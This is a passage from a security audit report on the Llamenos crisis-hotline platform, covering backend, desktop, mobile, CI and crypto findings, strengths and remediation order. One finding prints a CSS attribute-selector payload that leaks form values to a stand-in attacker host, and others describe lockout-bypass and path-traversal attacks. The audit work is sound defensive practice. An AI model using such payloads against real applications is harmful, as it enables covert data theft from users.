**Fix**: Scope key delivery to users with a specific elevated permission, or — as the architecture intends — migrate to per-hub key envelopes delivered via ECIES wrap (matching the hub key model). Each volunteer should receive only the key(s) for their hub(s), unwrapped client-side.

---

### HIGH-W2 (HIGH): Rate limiting and auth signature verification disabled by inverted environment check

**Component**: Worker — Authentication middleware
**File(s)**: `apps/worker/routes/auth.ts:42-48,88-94`; `apps/worker/middleware/auth.ts:25-35`
**Description**: Login and bootstrap rate limiting are skipped when `ENVIRONMENT !== 'development'` — the condition is inverted. This means rate limiting is active only in development and disabled in staging and production. WebAuthn signature verification is also skipped under the same condition.
**Impact**: An adversary who can reach a staging or production endpoint (or a deployment misconfigured with `ENVIRONMENT=development`) can perform unlimited brute-force attempts against any registered pubkey's auth session and bypass WebAuthn verification entirely.
**Fix**: Enforce rate limiting unconditionally. Introduce an explicit `DISABLE_RATE_LIMITING=true` environment variable for local development, verified absent by default. Never condition security controls on environment name.

---

### HIGH-W3 (HIGH): Raw caller phone number written to audit log in plaintext

**Component**: Worker — Audit logging / caller privacy
**File(s)**: `apps/worker/routes/bans.ts:63`
**Description**: `audit(services.audit, 'numberBanned', pubkey, { phone: body.phone })` writes the caller's raw phone number into the `details` field of the audit log. Caller PII must be encrypted at rest per the platform's security requirements.
**Impact**: A PostgreSQL breach exposes caller phone numbers in the audit table. For callers to a crisis hotline, phone number disclosure represents a direct safety risk — it enables targeted harassment, cross-referencing with call time and location data, and identification of individuals who sought crisis support.
**Fix**: Pass the phone through `hashPhone()` (which is already used elsewhere in the codebase) before writing to the audit log, or omit the phone entirely from audit log details and reference only the ban record ID.

---

### HIGH-W4 (HIGH): Dev endpoint returns `403` instead of `404` when no secret configured

**Component**: Worker — Dev endpoint
**File(s)**: `apps/worker/routes/dev.ts:101-121`
**Description**: When `ENVIRONMENT=development` is set but no `DEV_RESET_SECRET` is configured, the endpoint returns `403 Forbidden` rather than `404 Not Found`. The `403` response confirms the endpoint exists, which reveals the development/test API surface to an adversary probing the API.
**Impact**: Confirms the existence of a state-reset endpoint to any unauthenticated requester. Combined with other vulnerabilities, an attacker can determine whether a target deployment has development endpoints active.
**Fix**: Return `404` for all requests when no `DEV_RESET_SECRET` is configured, regardless of the `ENVIRONMENT` value.

---

### HIGH-W5 (HIGH): Missing `encodeURIComponent` on `accountSid` in Twilio test URL construction

**Component**: Worker — Settings / Twilio validation
**File(s)**: `apps/worker/routes/settings.ts:432-450`
**Description**: `accountSid` from the request body is interpolated directly into a Twilio API URL path without `encodeURIComponent`. If schema validation does not enforce a strict Twilio SID format, path traversal sequences in `accountSid` can manipulate the resulting Twilio API path.
**Impact**: An admin who submits a crafted `accountSid` value (e.g., containing `../` sequences or query parameter injection) may cause the server to fetch an unintended Twilio API resource, potentially leaking account information or producing unexpected behavior in the telephony configuration.
**Fix**: Verify that `telephonyProviderSchema` enforces a strict regex for Twilio SID format (`/^AC[a-f0-9]{32}$/`). Apply `encodeURIComponent` defensively to all user-supplied values interpolated into URL paths.

---

### Desktop

---

### HIGH-D1 (HIGH): `unsafe-inline` in `style-src` CSP enables CSS injection exfiltration

**Component**: Desktop — Content Security Policy
**File(s)**: `apps/desktop/tauri.conf.json:25`
**Description**: `"style-src": "'unsafe-inline' 'self'"` permits arbitrary inline style attributes and `<style>` blocks. CSS injection via crafted content (a volunteer's note, a caller name, a hub description) can use CSS attribute selectors to exfiltrate form field values character-by-character via requests to attacker-controlled URLs.
**Impact**: CSS-based data exfiltration bypasses script-blocking CSP. Under the nation-state threat model, CSS injection is a known technique for covertly extracting data from applications without triggering JavaScript security controls.
**Exploit Scenario**: A server-injected or adversarially crafted call note contains CSS that uses `input[value^="a"] { background: url('https://attacker.com/a') }` patterns. By iterating over all character possibilities, the attacker exfiltrates form field content one character at a time.
**Fix**: Remove `'unsafe-inline'` from `style-src`. Use CSS Modules, Tailwind (which generates hashed class names), or a nonce-based CSP approach for any styles that cannot be fully static.

---

### HIGH-D2 (HIGH): Isolation allowlist contains deregistered commands

**Component**: Desktop — Tauri isolation / IPC policy
**File(s)**: `apps/desktop/isolation/index.html:46-55`
**Description**: Commands `ecies_unwrap_key`, `decrypt_note`, `decrypt_message`, `encrypt_with_pin`, `decrypt_with_pin`, and `get_public_key` are allowlisted in the isolation script but have `#[allow(dead_code)]` annotations and are absent from `generate_handler![]`. The isolation policy and the registered handler set have drifted.
**Impact**: If a future developer re-registers any of these commands (e.g., during feature work that references old code), the isolation script silently permits them without any policy review. `decrypt_note` and `decrypt_message` in particular would represent a severe regression if re-enabled without proper review.
**Fix**: Remove all deregistered commands from the isolation allowlist. Add a CI check that parses both `generate_handler![]` and the isolation allowlist and fails if they diverge.

---

### HIGH-D3 (HIGH): PIN lockout counter stored in plain JSON — bypassable with filesystem access

**Component**: Desktop — PIN brute-force protection
**File(s)**: `apps/desktop/src/crypto.rs:98-156`
**Description**: `pin_failed_attempts` and `pin_lockout_until` are stored in `settings.json` via `tauri_plugin_store`, which writes plain JSON to disk. The counter is not stored in the Tauri Stronghold encrypted vault. An adversary with filesystem access can delete or modify `settings.json` to reset the counter between each PIN attempt.
**Impact**: The PIN brute-force protection (key wipe after 10 failed attempts) is entirely ineffective against an adversary with local filesystem access — precisely the threat model for physical device seizure by a nation-state or law enforcement. The adversary can perform unlimited PIN attempts.
**Fix**: Store `pin_failed_attempts` and `pin_lockout_until` in Tauri Stronghold, which is protected by the KEK and cannot be trivially reset by editing a JSON file. Alternatively, implement server-side rate limiting with server-issued nonces for PIN unlock.

---

### HIGH-D4 (HIGH): `process:allow-restart` capability granted unnecessarily

**Component**: Desktop — Tauri capabilities
**File(s)**: `apps/desktop/capabilities/default.json:39-40`
**Description**: Both `process:allow-exit` and `process:allow-restart` are granted. In combination with HIGH-D3 (plaintext lockout counter), JavaScript execution can force a process restart (resetting in-memory state) and then the attacker can reset the JSON counter file between restarts, enabling unlimited PIN attempts. The restart capability is not currently in the isolation allowlist, but the OS-level grant exists.
**Impact**: The restart capability creates a component in a multi-step lockout bypass chain. Its presence in capabilities is broader than necessary.
**Fix**: Remove `process:allow-restart` from `capabilities/default.json` if it is not actively required for a user-facing feature. Review whether `process:allow-exit` is strictly necessary or can be narrowed.

---

### iOS / Android

---

### HIGH-M1 (HIGH): Wake key ECIES label mismatch — iOS push notifications for incoming calls broken

**Component**: iOS / Android — Wake key ECIES domain separation
**File(s)**: `apps/ios/Sources/Services/WakeKeyService.swift:245`; `apps/android/app/src/main/java/org/llamenos/hotline/crypto/WakeKeyService.kt:140`
**Description**: iOS uses the HKDF info label `"llamenos:wake-key"` for wake key ECIES derivation. The Android client and backend use `LABEL_PUSH_WAKE = "llamenos:push-wake"`. ECIES uses this label as the HKDF info parameter for domain separation. Mismatched labels produce different derived keys. iOS wake key decryption fails at AEAD authentication for every incoming call.
**Impact**: iOS devices show no lock-screen notification for incoming crisis calls. Calls go unanswered on iOS. This is an operational failure that directly undermines the platform's core mission. This issue is noted in the project memory as a known discrepancy but appears unresolved.
**Fix**: Standardize to `"llamenos:push-wake"` (matching the backend constant `LABEL_PUSH_WAKE`). Update `WakeKeyService.swift` accordingly. After deploying the fix, re-register all iOS device wake key pairs with the server, as existing registered public keys were generated with the wrong label and will produce mismatched wrapping.

---

### HIGH-M2 (HIGH): PIN logged in plaintext in `#if DEBUG` preview callbacks

**Component**: iOS — PINPad UI
**File(s)**: `apps/ios/Sources/Views/Components/PINPadView.swift:188,200`
**Description**: `print("PIN entered: \(completed)")` logs the full PIN string inside `#if DEBUG` and `#Preview` blocks. During development and XCUITest on real devices, the PIN is written to the Xcode console and `idevicesyslog`. Development devices are frequently shared among team members.
**Impact**: Shared development devices expose volunteer PINs to other team members. During XCUITest execution on physical devices with connected logging, the PIN is captured in CI logs.
**Fix**: Remove both `print("PIN entered: \(completed)")` lines. Preview callbacks for UI testing do not require logging sensitive input values.

---

### HIGH-M3 (HIGH): Android missing explicit `android:usesCleartextTraffic="false"`

**Component**: Android — Network security
**File(s)**: `apps/android/app/src/main/AndroidManifest.xml`
**Description**: The `networkSecurityConfig` correctly sets `cleartextTrafficPermitted="false"` but the `<application>` element lacks the explicit `android:usesCleartextTraffic="false"` attribute. If the network security config XML is missing from the APK due to a resource merge conflict or misconfigured reference, cleartext traffic falls back to permitted on Android 8.0 and below (API 26 is `minSdk`).
**Impact**: Cleartext HTTP communications would expose volunteer authentication tokens, hub configuration, and API responses to any network observer. The defense-in-depth principle requires both the manifest attribute and the network security config.
**Fix**: Add `android:usesCleartextTraffic="false"` to the `<application>` element in `AndroidManifest.xml`.

---

### HIGH-M4 (HIGH): iOS lacks explicit ATS configuration

**Component**: iOS — App Transport Security
**File(s)**: `apps/ios/Sources/App/Info.plist`
**Description**: No `NSAppTransportSecurity` key is present in `Info.plist`. ATS is enabled by default, but its absence makes the security posture non-auditable and non-explicit. `AppState.swift:390` processes user-entered hub URLs, which may include `http://` prefixes that ATS would normally block.
**Impact**: Without explicit ATS configuration, the security posture is dependent on Apple's evolving defaults. App Store review may flag the absence. User-entered `http://` hub URLs may succeed or fail in non-obvious ways depending on ATS default behavior and iOS version.
**Fix**: Add an explicit `NSAppTransportSecurity` dictionary to `Info.plist` with `NSAllowsArbitraryLoads = false`. If local development hub URLs need HTTP, handle the exception explicitly in the developer build configuration only.

---

## 4. MEDIUM Findings

### CI/CD

---

### MED-CI1 (MEDIUM): GlitchTip deployed with `"change-me"` secret key fallback

**Component**: CI/CD — Error monitoring
**File(s)**: `deploy/docker/docker-compose.yml:227,256`
**Description**: `SECRET_KEY=${GLITCHTIP_SECRET_KEY:-change-me-to-a-random-string}` uses a shell default. If the environment variable is not set, GlitchTip uses the well-known fallback string for session signing and data encryption.
**Fix**: Replace with a required variable: `SECRET_KEY=${GLITCHTIP_SECRET_KEY:?GLITCHTIP_SECRET_KEY is required}`. This causes Docker Compose to fail at startup if the secret is unset, rather than silently using an insecure default.

---

### MED-CI2 (MEDIUM): Ansible example vars use `:latest` and unpinned images

**Component**: CI/CD — Deployment tooling
**File(s)**: `deploy/ansible/vars.example.yml:53-57`
**Description**: `llamenos_app_image: ghcr.io/llamenos/llamenos:latest` in the example configuration. Operators copying from the example file will deploy with unpinned images, undermining the reproducible build guarantees established elsewhere.
**Fix**: Pin to the same digest used in `docker-compose.yml`. Update the example file whenever production digests are rotated.

---

### MED-CI3 (MEDIUM): `bun audit` allows high-severity vulnerabilities to pass CI

**Component**: CI/CD — Dependency auditing
**File(s)**: `.github/workflows/ci.yml:190-194`
**Description**: The audit step only fails the pipeline on critical vulnerabilities. High-severity vulnerabilities produce a warning and allow the build to proceed. For a platform operating under a nation-state threat model, high-severity vulnerabilities in dependencies should be treated as blockers.
**Fix**: Change to `bun audit --audit-level=high` with enforced exit code. Establish a documented exception process for high-severity vulnerabilities that cannot be immediately patched.

---

### Crypto

---

### MED-C1 (MEDIUM): `xonly_to_compressed` always uses even-y prefix — ~50% key mismatch risk for non-BIP-340 keys

**Component**: Crypto — Key encoding
**File(s)**: `packages/crypto/src/ecies.rs:97-106`
**Description**: The function always prepends `0x02` (even-y). For BIP-340/Nostr x-only keys this is correct by convention, as BIP-340 lifts to the even-y point. However, `keys.rs:34` uses `pk.to_encoded_point(true)`, which produces `0x02` or `0x03` based on actual y-parity. If non-BIP-340 keys are ever processed by this function, ~50% will produce incorrect compressed points and ECIES will silently fail.
**Fix**: Add a clear code comment documenting that this function is BIP-340-only and must never be used with non-BIP-340 keys. Add a compile-time or runtime assertion. If non-BIP-340 pubkeys are introduced in future, use the full 33-byte compressed form throughout.

---

### MED-C2 (MEDIUM): Ephemeral secret key crosses WASM boundary as a string parameter

**Component**: Crypto — WASM provisioning
**File(s)**: `packages/crypto/src/wasm.rs:457-477`
**Description**: `decrypt_provisioned_nsec` accepts `ephemeral_sk_hex: &str` from JavaScript. The ephemeral secret key lives in the JavaScript heap as a string before the WASM call. Compromise of this key (via JS-level interception) allows decryption of the provisioning payload, which contains the nsec.
**Fix**: Add a WASM-side `generateEphemeralKeypair()` function that returns only the public key to JavaScript, retaining the ephemeral private key in WASM-managed memory. `decryptProvisionedNsec` then uses the internally retained ephemeral key without requiring it to be passed from JS.

---

### MED-C3 (MEDIUM): Static HKDF salt used for draft and export encryption

**Component**: Crypto — Draft/export key derivation
**File(s)**: `packages/crypto/src/encryption.rs:302-309`
**Description**: `HKDF_SALT = "llamenos:hkdf-salt:v1"` is a static constant used for draft and export encryption key derivation. All drafts on a given device share the same derived key for a given label. This is not per-operation randomness.
**Fix**: The correct model for draft encryption is the same per-note random key pattern used for note ECIES. The static HKDF salt is acceptable as a domain separator only when combined with per-operation randomness elsewhere in the derivation chain. Audit all callers of this constant to verify per-operation randomness is present.

---

### Worker

---

### MED-W1 (MEDIUM): Hub-scoped routes use global permissions — cross-hub access possible via global endpoint

**Component**: Worker — Authorization / hub scoping
**File(s)**: `apps/worker/middleware/hub.ts`; `apps/worker/app.ts:139-182`
**Description**: Routes mounted on both the global and hub-scoped routers check `c.get('permissions')` (global role permissions) rather than hub-specific permissions. A user with global `notes:read-own` can potentially access notes from any hub via the global endpoint path, even without any hub role assignment.
**Fix**: Audit every route mounted under both routers. Hub-scoped variants must enforce hub membership using `hubPermissions`. Ensure the empty-string `hubId` (treated as "global — all hubs") is restricted to super-admin only and does not inadvertently expand access.

---

### MED-W2 (MEDIUM): Direct ban by phone number bypasses caller identity protection model

**Component**: Worker — Ban management
**File(s)**: `apps/worker/routes/bans.ts:31-66`
**Description**: `POST /bans/` accepts a raw phone number from the volunteer's request body. The call-scoped `/calls/ban` endpoint has an explicit comment stating "server resolves phone number — volunteer never sees it." The direct ban path bypasses this protection, potentially exposing raw phone numbers to volunteers who should not see them.
**Fix**: Restrict `POST /bans/` raw phone submission to admin-role users only. The `bans:report` permission should be exercisable only through the call-scoped endpoint, which keeps phone number resolution server-side and opaque to volunteers.

---

### Desktop

---

### MED-D1 (MEDIUM): `wasm-unsafe-eval` in production Tauri CSP is unnecessary

**Component**: Desktop — Content Security Policy
**File(s)**: `apps/desktop/tauri.conf.json:22`
**Description**: `'wasm-unsafe-eval'` permits WASM instantiation from ArrayBuffer in the production Tauri build. All crypto in production routes through native Rust IPC — no WASM is loaded. This is unnecessary attack surface.
**Fix**: Remove `'wasm-unsafe-eval'` from the production Tauri CSP. If WASM is needed for specific test builds (e.g., WASM crypto for Playwright tests), enable it only in test build configurations.

---

### MED-D2 (MEDIUM): Stronghold initialized but never used for key storage

**Component**: Desktop — Tauri Stronghold
**File(s)**: `apps/desktop/capabilities/default.json:9`; `apps/desktop/src/lib.rs:11-25`
**Description**: Stronghold is initialized with a PBKDF2-derived KEK and `stronghold:default` is granted in capabilities. However, zero IPC commands read from or write to the Stronghold vault. Encrypted key data is stored in `tauri-plugin-store` (plain JSON file). The CLAUDE.md claim that the desktop uses "Tauri Stronghold, encrypted vault" does not reflect the current implementation.
**Fix**: Either migrate key persistence to Stronghold's vault (resolving the gap documented in the CLAUDE.md), or remove `stronghold:default` from capabilities to reflect that Stronghold is not in use, and update the documentation accordingly. The former is strongly preferred.

---

### MED-D3 (MEDIUM): `__TEST_INVOKE` on `window` exposes full crypto dispatch if guard fails

**Component**: Desktop — Test mock layer
**File(s)**: `tests/mocks/tauri-core.ts:249-251`
**Description**: `(window as Record<string, unknown>).__TEST_INVOKE = invoke` attaches the mock IPC dispatcher to a globally accessible, predictable string key. If the mock is ever imported in a non-Playwright build (e.g., a misconfigured Vite alias), it exposes full IPC command dispatch, including `get_nsec_from_state`, to any JavaScript.
**Fix**: Add a `import.meta.env.MODE !== 'production'` guard as a belt-and-suspenders check. Use a random or non-predictable symbol rather than the string `'__TEST_INVOKE'` to prevent accidental or intentional invocation.

---

### iOS / Android

---

### MED-M1 (MEDIUM): PIN logged in `#if DEBUG` preview callbacks

*(Promoted to HIGH-M2 due to shared development device risk — see HIGH-M2 above.)*

---

## 5. Positive Findings

The following security controls are well-implemented and represent genuine strengths of the platform:

**E2EE Architecture Intent**: The per-note ECIES key wrapping pattern — a unique random key per note, ECIES-wrapped separately for the volunteer and each admin — is architecturally sound and provides the correct forward-secrecy model when properly implemented.

**Protocol Codegen and Domain Separation**: The centralization of 28 ECIES/HKDF domain separation constants in `packages/protocol/crypto-labels.json` with codegen to all three platform languages (TypeScript, Swift, Kotlin) eliminates the class of bugs caused by inconsistent string literals across platforms. This is a well-designed approach.

**Tauri Isolation Script Pattern**: The presence of an isolation script (`apps/desktop/isolation/index.html`) that explicitly allowlists permitted IPC commands is the correct architectural pattern for Tauri webview security. The intent to limit the IPC surface is sound, even though the current allowlist has drifted from the registered handlers (HIGH-D2).

**Single Rust Crypto Implementation**: Centralizing all cryptographic operations in `packages/crypto/` as a single Rust crate compiled to native, WASM, and UniFFI is the right approach for an auditable, consistent crypto implementation across all platforms. This eliminates per-platform crypto implementation bugs.

**WebAuthn Session Tokens**: Using WebAuthn session tokens for multi-device support rather than long-lived password-based sessions is appropriate for the threat model and reduces credential theft risk.

**Hub Key Rotation on Member Departure**: The hub key rotation model — excluding the departed member — is correctly designed to provide forward secrecy for organizational events after offboarding.

**Reproducible Build Infrastructure**: `Dockerfile.build` with `SOURCE_DATE_EPOCH`, content-hashed filenames, `CHECKSUMS.txt`, and SLSA provenance is a strong supply chain security foundation. The gap is in applying this consistently to production images (CRIT-CI2).

**Caller Identity Protection Architecture**: The call-scoped ban endpoint design (server resolves phone, volunteer never sees it) and the use of `hashPhone()` in most audit paths demonstrate the correct instinct for caller identity protection. The gaps identified are deviations from a generally sound model.

**Per-Test PostgreSQL Schema Isolation**: The `POST /api/test-create-hub` endpoint and hub-per-worker test isolation design eliminates shared state between parallel test workers, which is the correct approach for a security-sensitive test suite.

**Nostr Tag Opacity**: Using generic tags (`["t", "llamenos:event"]`) so the relay cannot distinguish event types is a correct implementation of the zero-knowledge relay design. The relay operator cannot perform traffic analysis on event categories.

---

## 6. Recommended Remediation Order

Remediation is sequenced by dependency order. Critical findings in each component must be resolved before moving to the next layer. Platform-specific work can proceed in parallel once the shared crypto and worker foundations are secured.

---

### Epic SA-1: CI/CD Hardening (Blocker — execute before any release build)

Addresses: CRIT-CI1, CRIT-CI2, HIGH-CI1 through HIGH-CI7, MED-CI1, MED-CI2, MED-CI3

Rationale: Release pipeline compromise (CRIT-CI1) yields signing keys that produce permanently trusted binaries for all installed clients. All subsequent work is undermined if the build infrastructure is compromised. Docker image pinning (CRIT-CI2) must be resolved before any production deployment.

Steps:
1. Fix workflow input injection (CRIT-CI1) — environment variable indirection.
2. Pin all production Docker images to digest (CRIT-CI2, HIGH-CI2, HIGH-CI3).
3. Add `--locked` and `--frozen-lockfile` to all `cargo install` and `bun install` calls (HIGH-CI1, HIGH-CI4).
4. Scope workflow permissions to per-job least privilege (HIGH-CI5).
5. Add RustFS checksum verification (HIGH-CI6).
6. Audit and rotate any secrets found in git history (HIGH-CI7).
7. Enforce required environment variables with `:?` syntax (MED-CI1).
8. Pin Ansible example vars (MED-CI2).
9. Enforce `--audit-level=high` in dependency audit step (MED-CI3).

---

### Epic SA-2: Crypto Crate Security (Blocker — execute before worker or platform work)

Addresses: CRIT-C1, CRIT-C2, CRIT-C3, HIGH-C1 through HIGH-C5, MED-C1, MED-C2, MED-C3

Rationale: The crypto crate is shared across all platforms. Fixes here propagate to Worker (WASM), Desktop (native), iOS, and Android (UniFFI). CRIT-C3 (KDF mismatch) blocks device linking from functioning correctly. CRIT-C1 (saltless HKDF) affects all ECIES operations.

Steps:
1. Add domain-specific static salt to `derive_ecies_key_v2` (CRIT-C1). Coordinate the exact byte string across WASM, Rust native, and mobile FFI.
2. Remove v1 legacy decryption path entirely (CRIT-C2).
3. Unify provisioning KDF to HKDF v2 in both `ffi.rs` and `provisioning.rs` (CRIT-C3). Add cross-platform round-trip test.
4. Wrap `secret_key_hex` in `Zeroizing<String>`; zeroize all intermediate key buffers (HIGH-C1, HIGH-C2).
5. Remove `secret_key_hex` from the UniFFI `KeyPair` record when `feature = "mobile"` (HIGH-C3).
6. Add PIN validation to `derive_kek_hex` or remove the direct FFI export (HIGH-C4).
7. Remove `get_nsec()` from `wasm.rs` (HIGH-C5).
8. Document BIP-340-only scope of `xonly_to_compressed`; add assertion (MED-C1).
9. Move ephemeral key generation to WASM side (MED-C2).
10. Audit all static HKDF salt callers for per-operation randomness (MED-C3).

---

### Epic SA-3: Worker Backend Security

Addresses: CRIT-H1, CRIT-W1, CRIT-W2, HIGH-H1, HIGH-H2, HIGH-W1 through HIGH-W5, MED-W1, MED-W2

Rationale: Worker security is foundational to all client platforms. Webhook signature bypass (CRIT-W1) and hub membership check gaps (CRIT-H1) are exploitable from the network without client access. Global relay key delivery (HIGH-W1) must be scoped before any client work proceeds on hub key isolation.

Steps:
1. Add hub membership check to `GET /api/hubs/:hubId/key` (CRIT-H1).
2. Fix Twilio webhook hub selection — derive hub server-side from CallSid (CRIT-W1).
3. Map volunteer pubkeys server-side at ring time; remove URL param pubkey acceptance (CRIT-W2).
4. Scope `serverEventKeyHex` delivery or migrate to per-hub ECIES envelopes (HIGH-W1).
5. Fix inverted rate limiting check; introduce explicit `DISABLE_RATE_LIMITING` flag (HIGH-W2).
6. Hash phone number before writing to audit log (HIGH-W3).
7. Return 404 (not 403) when dev endpoint secret is unconfigured (HIGH-W4).
8. Enforce Twilio SID format validation and apply `encodeURIComponent` (HIGH-W5).
9. Audit hub-scoped vs. global route permission enforcement (MED-W1).
10. Restrict raw phone ban submission to admin role (MED-W2).

---

### Epic SA-4: Desktop Security

Addresses: CRIT-D1, CRIT-D2, CRIT-D3, CRIT-D4, HIGH-D1 through HIGH-D4, MED-D1, MED-D2, MED-D3

Rationale: Desktop fixes depend on the crypto crate changes from SA-2 (specifically removing the KeyPair fields that carry secret material). CRIT-D1 through CRIT-D3 are the highest-impact findings in the codebase — the nsec-in-webview violations directly negate the zero-trust claim.

Steps:
1. Redesign `generate_keypair` and `key_pair_from_nsec` IPC commands to return pubkey only (CRIT-D1).
2. Remove `get_nsec_from_state` from handlers and isolation allowlist (CRIT-D2).
3. Remove `create_auth_token` from handlers and isolation allowlist (CRIT-D3).
4. Generate real Ed25519 updater signing key and commit only the public key (CRIT-D4).
5. Remove `'unsafe-inline'` from `style-src` CSP (HIGH-D1).
6. Synchronize isolation allowlist with `generate_handler![]`; add CI divergence check (HIGH-D2).
7. Migrate PIN lockout counter to Tauri Stronghold (HIGH-D3).
8. Remove `process:allow-restart` from capabilities (HIGH-D4).
9. Remove `'wasm-unsafe-eval'` from production CSP (MED-D1).
10. Migrate key persistence to Stronghold or remove the capability and correct documentation (MED-D2).
11. Add production mode guard and non-predictable symbol to `__TEST_INVOKE` (MED-D3).

---

### Epic SA-5: iOS Security

Addresses: CRIT-H2, CRIT-M1, CRIT-M3, HIGH-H1, HIGH-H3, HIGH-M1, HIGH-M2, HIGH-M4

Rationale: iOS work depends on the wake key label fix (HIGH-M1 affects Crypto crate and backend alignment) and the hub key model clarification from SA-3 (HIGH-H1). CRIT-M3 (hardcoded admin key) must be resolved and the key rotated before any other iOS work, as it represents an immediately exploitable compromise.

Steps:
1. Remove all hardcoded private key values from source and comments; rotate the key (CRIT-M3 — immediate action, no dependency).
2. Remove plaintext `print` for decrypted push payload; use `os_log` at `.private` (CRIT-M1).
3. Implement full hub switch sequence: disconnect WebSocket, nil key, reconnect, re-authenticate (CRIT-H2).
4. Standardize wake key ECIES label to `"llamenos:push-wake"` and re-register wake keys (HIGH-M1).
5. Implement or verify client-side hub key ECIES unwrap (HIGH-H1).
6. Move `activeHubSlug` from `UserDefaults` to `KeychainService` (HIGH-H3).
7. Remove PIN `print` statements from preview closures (HIGH-M2).
8. Add explicit `NSAppTransportSecurity` to `Info.plist` (HIGH-M4).

---

### Epic SA-6: Android Security

Addresses: CRIT-H3, CRIT-M2, HIGH-H2, HIGH-H3, HIGH-M3

Rationale: Android work shares the hub switching (CRIT-H3) and wake key label (HIGH-M1 — already addressed in SA-5 crypto coordination) dependencies. CRIT-M2 (crash reporter fallback) can be fixed immediately with no dependencies.

Steps:
1. Remove crash reporter plaintext fallback (CRIT-M2 — immediate action, no dependency).
2. Implement full hub switch sequence in `HubManagementViewModel`: disconnect WebSocket, clear key, reconnect (CRIT-H3).
3. Include `hubId` in encrypted wake payload; verify against active hub in `PushService` (HIGH-H2).
4. Add `android:usesCleartextTraffic="false"` to `AndroidManifest.xml` (HIGH-M3).

---

*End of Llamenos Platform Security Audit Report*